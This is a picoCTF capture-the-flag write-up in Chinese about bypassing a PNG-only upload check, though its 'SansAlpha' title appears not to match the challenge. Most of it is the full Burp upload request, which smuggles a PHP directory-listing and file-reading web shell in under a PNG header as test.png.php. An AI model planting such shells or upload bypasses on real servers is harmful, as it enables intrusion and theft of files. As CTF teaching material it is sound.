
# SansAlpha
[Challenge](https://play.picoctf.org/practice/challenge/445)

## Description

I found a web app that can help process images: PNG images only!

## Solution

目標機就是一個可以上傳圖片的網站，這題也算是蠻直觀的經典考題，因為題目只能上傳PNG，應該就是要考惡意程式上傳。

![Untitled](/picoCTF%202024/img/2024_5.png)

先來看一下有沒有甚麼線索，連到`/robots.txt`看

![Untitled](/picoCTF%202024/img/2024_6.png)

可以看到他有一個`/uploads/`跟一個文件，那個上傳資料夾應該就是上傳後的檔案位置，那文件裡面的內容則是寫到上傳檔案的判斷依據。

![Untitled](/picoCTF%202024/img/2024_7.png)

根據`instructions.txt`的說法，看來它只透過標頭去做判斷，接下來就是嘗試上傳一個正常的PNG檔案並用Burp把請求攔截下來，然後將檔案名稱改成php，內容改成想要的shell，底下附上我最後送出的上傳請求以及shell的內容，這支shell可以將目錄走訪直接做在畫面上，很方便

```
POST / HTTP/1.1
Host: atlas.picoctf.net:60607
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------419861389234077765582180596946
Content-Length: 693
Origin: http://atlas.picoctf.net:60607
Connection: close
Referer: http://atlas.picoctf.net:60607/
Upgrade-Insecure-Requests: 1

-----------------------------419861389234077765582180596946
Content-Disposition: form-data; name="file"; filename="test.png.php"
Content-Type: image/png

PNG
<?

if($_GET['file']) {
	$fichero=$_GET['file']; 
	} else {
	$fichero="/";
	} 

if($handle = @opendir($fichero)) {
  while($filename = readdir($handle)) {
    echo "( ) <a href=?file=" . $fichero . "/" . $filename . ">" . $filename . "</a><br>";
    }
  closedir($handle);
  } else {
  echo "FILE: " . $fichero . "<br><hr><pre>";
  $fp = fopen($fichero, "r");
  $buffer = fread($fp, filesize($fichero));
  echo $buffer;
  fclose($fp);
  }

?>
-----------------------------419861389234077765582180596946--
```
